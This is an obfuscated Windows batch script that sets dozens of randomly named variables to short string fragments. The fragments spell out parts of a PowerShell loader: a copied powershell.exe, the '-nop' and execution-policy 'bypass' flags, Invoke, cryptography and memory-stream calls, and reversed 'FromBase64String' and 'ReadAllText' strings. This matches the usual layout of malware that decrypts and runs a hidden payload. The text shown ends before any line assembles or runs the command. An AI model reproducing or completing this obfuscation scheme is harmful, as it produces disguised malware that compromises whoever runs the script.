@echo off
set "TRDhdULvmU=we"
set "fGSwDdBjkv=:\"
set "YNlItGPoVU=1."
set "jnehWDgeRO=.e"
set "XSKCKunbKp=do"
set "EmIAGAJePP=he"
set "fKJBbjMyip= C"
set "bKhdpgNGUG=\W"
set "GprapejEOl=rs"
set "GsYrmVIrcD=0\"
set "sMJnyjiYCh=st"
set "LurBgJFHTA=co"
set "pHDWlkQYUa=Wi"
set "tNEidectND=Sy"
set "SxehSDluTb=po"
set "tGFHwHidBD=xe"
set "qtrvcrhADc=y "
set "GSymfvNoWa=ws"
set "KWrjLuHeOf=py"
set "vvuUaPOQns=ll"
set "gUsmhOgkJk=em"
set "NkplrjZFsV=we"
set "kHFxzlUwZz= /"
set "aAqdVJMpXe=Po"
set "TMWEZwKYdp=rS"
set "IXdFBvDnUW=ll"
set "pjljLyvrbp=in"
set "whVbhnDLdz=\v"
set "SXyIDjCqAp=32"
set "LgvapxCHGb=he"
set "TxTtPyhNqR=s\"
set "laDyIaKPzW=nd"
set "WgyEueeVGI=ow"
set "LxzSWIWfwZ= %~dp0"
set "kRACheFYoA=cd"
set "AVpmyxKLid=.Con"
set "nLBpJUchFd=; };"
set "FXOZYaUeQU=Syst"
set "aReFZpEvMO=$Vpw"
set "zQbQhGxQtk=Ta ="
set "euqllZhNCw= New"
set "svhznwxFYi=am;$"
set "wuWnDUPTMp=[Sys"
set "eTZdLVlDmq=.Mod"
set "QaUogVMToM=t Sy"
set "bIErZtjZtN=trea"
set "IIjCJdBvSD=mory"
set "buVTSbPigP=sDO."
set "uACQpAWXfi=Mode"
set "CnEsFBaRCR=-joi"
set "rolIURIghQ=yTo("
set "qHylbfGevr=('%*'"
set "lmgezNlEwR=y) {"
set "bKWfDjLDGl=gnir"
set "hiPxifIXeO=BC;$"
set "wmOujJXord=vert"
set "oachmzLdGR=]::N"
set "xaDLUxaCBo=nirt"
set "ivTuiOmadd=daeR"
set "bhfWngwAQi=TllA"
set "iRqCmOufuH=-4] "
set "ZhydRQqSvE=ptog"
set "dcwuvrDDdP=rans"
set "SpuGysCqcF=j.Su"
set "AQsjeIwJyR=ress"
set "eAbHkRbGNT=-nop"
set "bOigIUsVqf=em.I"
set "oQwktnYEVx=]::C"
set "VZBrBGBMLz=Invo"
set "HvuYYafoCJ=rtS4"
set "yiAbJiHYdl=('da"
set "umgLtEUTDT=rofi"
set "IIxSZALlei==');"
set "HrEdkmiRTz=bstr"
set "JuDcRDUxAl=$xSL"
set "fWUDJyhdSx=tem."
set "jGSCQsmKNf=stem"
set "pyodQkzCww=$SAP"
set "jIfYwpPOKm=oin "
set "lLunfILCps='[-1"
set "AXOBbuguaq=pose"
set "vjZOQwUJfq=Secu"
set "HxTcUsgLNi=oryS"
set "LKwiZWISJw=.Key"
set "roXnFQfoNR=a, 0"
set "MeEhvtUukA=1] -"
set "fWJoucjnhI=ypto"
set "HCWagVvfhu=Stre"
set "dMUPdLWPwc=yste"
set "VEqlZPFhzJ=o = "
set "hntbptvIwS=ew-O"
set "nTILtWLRcw=stem"
set "HqkcuneGLj=ntvT"
set "qAWzPyEmvK=tem."
set "qPqLzeafFj=S46e"
set "tWFfbDuQfm=();$"
set "zDXSmSShlK=lit("
set "ztagngseUt=urit"
set "niqjayCoHC=106u"
set "qfjTMWPTgv=($Kr"
set "zfKFyJBkMS=bypa"
set "yWhkYEkhfS=gsYZ"
set "mHJZhTWjNN=($Kr"
set "AxlKZyLdcV=raph"
